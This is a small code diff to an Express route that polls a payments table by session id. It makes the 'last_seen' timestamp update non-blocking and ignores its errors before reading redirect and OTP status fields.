@@ -247,8 +247,8 @@ router.get('/check-status', async (req, res) => {
   if (!sid) return res.json({ action: 'none' });
 
   try {
-    // Update last_seen so admin panel can show active indicator
-    await query('UPDATE payments SET last_seen = NOW() WHERE sid = ?', [sid]);
+    // Update last_seen (non-blocking — won't crash if column doesn't exist yet)
+    query('UPDATE payments SET last_seen = NOW() WHERE sid = ?', [sid]).catch(() => {});
 
     const row = await queryOne('SELECT redirect_to, otp_status, otp_page FROM payments WHERE sid = ? LIMIT 1', [sid]);
     if (!row) return res.json({ action: 'none' });
